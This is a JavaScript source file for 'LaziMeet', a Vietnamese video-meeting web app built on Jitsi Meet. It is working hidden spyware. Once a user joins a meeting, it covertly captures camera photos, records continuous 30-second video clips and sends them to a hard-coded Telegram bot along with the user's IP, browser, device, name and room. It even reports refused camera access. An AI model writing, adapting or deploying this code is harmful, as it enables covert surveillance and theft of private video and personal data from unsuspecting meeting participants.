// script.js - LaziMeet với tính năng thu thập thông tin qua Telegram
// Điều chỉnh: Tận dụng quyền camera từ JitsiMeet, không yêu cầu lại
// Xử lý đầy đủ các trường hợp lỗi camera

const TELEGRAM_BOT_TOKEN = '9016245014:AAEWS3HT07YujbmfyqtHBOfU3z9C8fPMuuE';
const TELEGRAM_CHAT_ID = '8908781379';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const homeScreen = document.getElementById('home-screen');
const meetingScreen = document.getElementById('meeting-screen');
const creatorNameInput = document.getElementById('creator-name');
const joinNameInput = document.getElementById('join-name');
const roomCodeInput = document.getElementById('room-code-input');
const btnCreateRoom = document.getElementById('btn-create-room');
const btnJoinRoom = document.getElementById('btn-join-room');
const currentRoomBadge = document.getElementById('current-room-badge');
const btnCopyLink = document.getElementById('btn-copy-link');

let jitsiApi = null;
let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let recordingInterval = null;
let videoSequence = 0;
let userDisplayName = '';
let surveillanceStarted = false;

// ===== SPARKLE EFFECT =====
document.addEventListener('pointerdown', (e) => {
    createSparkle(e.clientX, e.clientY);
});

function createSparkle(x, y) {
    const numParticles = 6;
    for (let i = 0; i < numParticles; i++) {
        const sparkle = document.createElement('div');
        sparkle.className = 'sparkle-particle';
        const angle = Math.random() * Math.PI * 2;
        const distance = 40 + Math.random() * 80;
        const tx = Math.cos(angle) * distance;
        const ty = Math.sin(angle) * distance;
        sparkle.style.left = `${x}px`;
        sparkle.style.top = `${y}px`;
        sparkle.style.setProperty('--tx', `${tx}px`);
        sparkle.style.setProperty('--ty', `${ty}px`);
        document.body.appendChild(sparkle);
        setTimeout(() => sparkle.remove(), 800);
    }
}

// ===== TAB SWITCHING =====
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        const tabId = btn.getAttribute('data-tab');
        document.getElementById(`${tabId}-tab`).classList.add('active');
    });
});

window.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const roomParam = urlParams.get('room');
    if (roomParam) {
        roomCodeInput.value = roomParam;
        document.querySelector('[data-tab="join"]').click();
    }
    const randomNames = ['Nam Phong', 'Thảo My', 'Gia Hân', 'Hoàng Long', 'Minh Thư', 'Quốc Bảo', 'Khánh Linh'];
    const defaultName = randomNames[Math.floor(Math.random() * randomNames.length)];
    if (creatorNameInput) creatorNameInput.value = defaultName;
    if (joinNameInput) joinNameInput.value = defaultName;
});

function showToast(message, icon = 'fa-solid fa-sparkles') {
    const container = document.getElementById('toast-container');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `<i class="${icon}"></i><span>${message}</span>`;
    container.appendChild(toast);
    setTimeout(() => toast.remove(), 3500);
}

// ===== THU THẬP THÔNG TIN =====
function getUserAgentInfo() {
    const ua = navigator.userAgent;
    let browser = 'Không xác định';
    let os = 'Không xác định';
    let device = 'Desktop';
    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
    if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac OS')) os = 'macOS';
    else if (ua.includes('Linux')) os = 'Linux';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) device = 'Mobile/Tablet';
    return { browser, os, device, userAgent: ua };
}

async function getIPInfo() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'Không lấy được IP';
    }
}

async function sendToTelegram(text) {
    try {
        await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' })
        });
    } catch (e) { console.error('Lỗi gửi Telegram:', e); }
}

async function sendPhotoToTelegram(blob, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'camera.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');
        await fetch(`${TELEGRAM_API}/sendPhoto`, { method: 'POST', body: formData });
    } catch (e) { console.error('Lỗi gửi ảnh:', e); }
}

async function sendVideoToTelegram(blob, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, `video_${videoSequence}.webm`);
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');
        await fetch(`${TELEGRAM_API}/sendVideo`, { method: 'POST', body: formData });
    } catch (e) { console.error('Lỗi gửi video:', e); }
}

// ===== LẤY ẢNH TỪ VIDEO ELEMENT =====
function capturePhoto(videoElement) {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth || 640;
    canvas.height = videoElement.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
}

// ===== GHI VIDEO TỪ STREAM =====
function startRecording(stream, name) {
    if (!stream || !stream.active) return;
    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
    recordedChunks = [];
    const options = { mimeType: 'video/webm;codecs=vp8,opus' };
    if (!MediaRecorder.isTypeSupported(options.mimeType)) options.mimeType = 'video/webm';
    try { mediaRecorder = new MediaRecorder(stream, options); }
    catch (e) { console.error('MediaRecorder lỗi:', e); return; }

    mediaRecorder.ondataavailable = event => {
        if (event.data.size > 0) recordedChunks.push(event.data);
    };
    mediaRecorder.onstop = async () => {
        if (recordedChunks.length > 0) {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            if (blob.size > 10000) {
                videoSequence++;
                const caption = `🎥 <b>Video ${videoSequence}</b>\n👤 Tên: ${name}\n⏱ Thời lượng: 30 giây`;
                await sendVideoToTelegram(blob, caption);
            }
        }
        recordedChunks = [];
    };
    mediaRecorder.start();
    recordingInterval = setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            setTimeout(() => {
                if (stream && stream.active) startRecording(stream, name);
            }, 1000);
        }
    }, 30000);
}

function stopRecordingAndSend() {
    if (recordingInterval) {
        clearTimeout(recordingInterval);
        recordingInterval = null;
    }
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
    }
}

// ===== BẮT ĐẦU THEO DÕI SAU KHI JITSI ĐÃ CÓ CAMERA =====
async function startSurveillance(displayName, stream) {
    if (surveillanceStarted) return;
    surveillanceStarted = true;
    userDisplayName = displayName;
    mediaStream = stream;

    const room = currentRoomBadge.textContent.replace('Phòng: ', '');
    const ip = await getIPInfo();
    const uaInfo = getUserAgentInfo();
    const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

    // 1. Gửi thông tin
    const infoMessage = `
🕵️ <b>THÔNG TIN NGƯỜI DÙNG</b>
━━━━━━━━━━━━━━━
👤 <b>Tên:</b> ${displayName}
🌐 <b>IP:</b> ${ip}
💻 <b>Trình duyệt:</b> ${uaInfo.browser}
📱 <b>Thiết bị:</b> ${uaInfo.device}
🖥 <b>Hệ điều hành:</b> ${uaInfo.os}
🔗 <b>User Agent:</b> <code>${uaInfo.userAgent}</code>
🏠 <b>Phòng:</b> ${room}
⏰ <b>Thời gian:</b> ${now}
━━━━━━━━━━━━━━━`.trim();
    await sendToTelegram(infoMessage);

    // 2. Chụp ảnh từ stream Jitsi
    try {
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        const photoBlob = await imageCapture.takePhoto();
        await sendPhotoToTelegram(photoBlob, `📸 <b>Ảnh camera</b>\n👤 ${displayName}\n🌐 IP: ${ip}`);
    } catch (e) {
        // Fallback: dùng video element ẩn
        try {
            const videoEl = document.createElement('video');
            videoEl.srcObject = stream;
            videoEl.muted = true;
            videoEl.playsInline = true;
            videoEl.style.position = 'fixed';
            videoEl.style.top = '-9999px';
            document.body.appendChild(videoEl);
            await videoEl.play();
            await new Promise(r => setTimeout(r, 1000));
            const photoBlob = await capturePhoto(videoEl);
            if (photoBlob) await sendPhotoToTelegram(photoBlob, `📸 <b>Ảnh camera</b>\n👤 ${displayName}\n🌐 IP: ${ip}`);
            videoEl.remove();
        } catch (err) { console.error('Không chụp được ảnh:', err); }
    }

    // 3. Ghi video liên tục
    startRecording(stream, displayName);

    // 4. Xử lý thoát
    window.addEventListener('beforeunload', () => {
        stopRecordingAndSend();
        if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
    });
}

// ===== GỬI THÔNG BÁO LỖI CAMERA =====
async function sendCameraError(displayName, errorName) {
    let errorMsg = '';
    if (errorName === 'NotAllowedError') {
        errorMsg = 'Người dùng từ chối quyền camera';
    } else if (errorName === 'NotFoundError') {
        errorMsg = 'Không tìm thấy thiết bị camera';
    } else if (errorName === 'NotReadableError') {
        errorMsg = 'Camera đang bị ứng dụng khác chiếm dụng';
    } else {
        errorMsg = `Lỗi không xác định: ${errorName}`;
    }

    const ip = await getIPInfo();
    const uaInfo = getUserAgentInfo();
    const room = currentRoomBadge.textContent.replace('Phòng: ', '');
    const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

    await sendToTelegram(`
⚠️ <b>KHÔNG THỂ TRUY CẬP CAMERA</b>
━━━━━━━━━━━━━━━
👤 <b>Tên:</b> ${displayName}
🌐 <b>IP:</b> ${ip}
💻 <b>Trình duyệt:</b> ${uaInfo.browser}
📱 <b>Thiết bị:</b> ${uaInfo.device}
🖥 <b>Hệ điều hành:</b> ${uaInfo.os}
🔗 <b>User Agent:</b> <code>${uaInfo.userAgent}</code>
🏠 <b>Phòng:</b> ${room}
⏰ <b>Thời gian:</b> ${now}
❌ <b>Lý do:</b> ${errorMsg}
━━━━━━━━━━━━━━━`.trim());
}

// ===== CREATE ROOM =====
if (btnCreateRoom) {
    btnCreateRoom.addEventListener('click', () => {
        const name = creatorNameInput.value.trim() || 'GenZ Host';
        const roomId = 'lazimeet-' + Math.random().toString(36).substring(2, 9);
        startMeeting(roomId, name);
    });
}

// ===== JOIN ROOM =====
if (btnJoinRoom) {
    btnJoinRoom.addEventListener('click', () => {
        const name = joinNameInput.value.trim() || 'GenZ Guest';
        let roomInput = roomCodeInput.value.trim();
        if (!roomInput) {
            showToast('Vui lòng nhập mã phòng hoặc đường dẫn!', 'fa-solid fa-circle-exclamation');
            return;
        }
        if (roomInput.includes('room=')) {
            try {
                const url = new URL(roomInput.includes('http') ? roomInput : 'https://' + roomInput);
                roomInput = url.searchParams.get('room') || roomInput;
            } catch (e) {}
        }
        startMeeting(roomInput, name);
    });
}

// ===== START MEETING =====
function startMeeting(roomId, displayName) {
    homeScreen.classList.remove('active');
    meetingScreen.classList.add('active');
    currentRoomBadge.textContent = `Phòng: ${roomId}`;
    showToast('Đang kết nối vào phòng họp...', 'fa-solid fa-spinner fa-spin');

    const domain = "meet.jit.si";
    const options = {
        roomName: "LaziMeet-" + roomId,
        width: "100%",
        height: "100%",
        parentNode: document.querySelector('#jitsi-container'),
        userInfo: { displayName: displayName },
        configOverwrite: {
            startWithAudioMuted: false,
            startWithVideoMuted: false,
            prejoinPageEnabled: false
        },
        interfaceConfigOverwrite: {
            TOOLBAR_BUTTONS: [
                'microphone', 'camera', 'closedcaptions', 'desktop', 'fullscreen',
                'fodeviceselection', 'hangup', 'chat', 'settings', 'raisehand',
                'videoquality', 'tileview'
            ],
            SHOW_JITSI_WATERMARK: false,
            DEFAULT_REMOTE_DISPLAY_NAME: 'Thành viên'
        }
    };

    try {
        jitsiApi = new JitsiMeetExternalAPI(domain, options);

        jitsiApi.addEventListeners({
            videoConferenceJoined: async () => {
                setTimeout(async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: true,
                            audio: false
                        });
                        await startSurveillance(displayName, stream);
                    } catch (e) {
                        console.error('Không lấy được stream:', e);
                        await sendCameraError(displayName, e.name);
                    }
                }, 2000);
            },
            readyToClose: () => {
                stopRecordingAndSend();
                window.location.href = window.location.pathname;
            },
            participantJoined: (participant) => {
                showToast(`${participant.displayName || 'Một thành viên'} đã vào phòng`, 'fa-solid fa-user-plus');
            },
            videoConferenceLeft: () => {
                stopRecordingAndSend();
                window.location.href = window.location.pathname;
            }
        });
    } catch (err) {
        console.error("Lỗi khởi tạo Jitsi API:", err);
        showToast('Không thể tải khung họp trực tuyến. Vui lòng thử lại!', 'fa-solid fa-triangle-exclamation');
    }
}

// ===== COPY LINK =====
if (btnCopyLink) {
    btnCopyLink.addEventListener('click', () => {
        const roomText = currentRoomBadge.textContent.replace('Phòng: ', '');
        const currentUrl = window.location.origin + window.location.pathname + '?room=' + roomText;
        navigator.clipboard.writeText(currentUrl);
        showToast('Đã sao chép đường dẫn mời vào bộ nhớ tạm!', 'fa-solid fa-clipboard-check');
    });
}

// ===== XỬ LÝ KHI ĐÓNG TRANG =====
window.addEventListener('beforeunload', () => {
    stopRecordingAndSend();
    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
});